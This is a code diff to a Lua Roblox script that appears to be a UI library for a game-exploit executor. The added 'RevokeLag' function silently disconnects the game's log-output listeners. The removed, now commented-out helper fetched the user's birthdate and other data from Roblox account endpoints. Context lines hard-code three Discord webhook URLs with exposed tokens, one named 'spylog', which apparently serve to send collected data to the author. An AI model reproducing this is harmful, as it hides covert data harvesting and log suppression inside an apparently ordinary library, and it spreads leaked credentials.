@@ -12,6 +12,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local GroupService = game:GetService("GroupService")
 local workspace = game:GetService("Workspace")
 local GUID = HttpService:GenerateGUID(false)
+local LogService = game:GetService("LogService")
 local HTMLcolors = { 
     ["Red"] = "rgb(255, 0, 0)",
     ["Yellow"] = "rgb(255, 255, 0)",
@@ -378,20 +379,15 @@ local function Virtual_Region()
 	end
 end
 
-local function getDataFromAPI(dataURL)
-local options = http({
-    Url = dataURL,
-    Method = "GET",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    }
-})
-
-    local getData = HttpService:JSONDecode(options)
-    return getData
+local function RevokeLag()
+	task.spawn(function()
+		for i,v in pairs(getconnections(LogService["MessageOut"])) do
+			v:Disconnect()
+		end
+	end)
 end
 
-local function dataDecode(typ)
+--[[local function dataDecode(typ)
 	if typ == "birth" then
 		return getDataFromAPI("https://accountinformation.roblox.com/v1/birthdate")
 	elseif typ == "desc" then
@@ -412,7 +408,7 @@ local function dataDecode(typ)
 		lib:WarnUser("null information",{AutoClose = false,CanClick = true,Duration = 9e9})
 	end
 end
-
+]]
 local url = "https://discord.com/api/webhooks/1212344550505324594/qCGYPkCwmBD3SPV2jpop_nn8qPBKxB9HQ8g62hJT-Lub0TD1Gmgdj3nolXt9rqxsCax0"
 local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
 local spylog = "https://discord.com/api/webhooks/1212007908368195624/-aftzn9Z8gj1rmq4CiM_P6JjoRdVXetBbIv9VGQwWO7d3VMo3WTbbxIJcNHWLXmKKFgH"
@@ -621,6 +617,7 @@ function lib:Window(text, preset, closebind)
 			MobileToggled = true
 			uitoggled = true
 			OpenHideUI.Text = "SHOW UI"
+			RevokeLag()
 			Main:TweenSize(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true,function()
                             ui.Enabled = false
                         end)
@@ -629,6 +626,7 @@ function lib:Window(text, preset, closebind)
 			uitoggled = false
 			ui.Enabled = true
 			OpenHideUI.Text = "HIDE UI"
+			RevokeLag()
 			Main:TweenSize(UDim2.new(0,560,0,319),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true)
 			--[[Main:TweenSize(UDim2.new(0,560,0,319),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true,function()
                             ui.Enabled = true
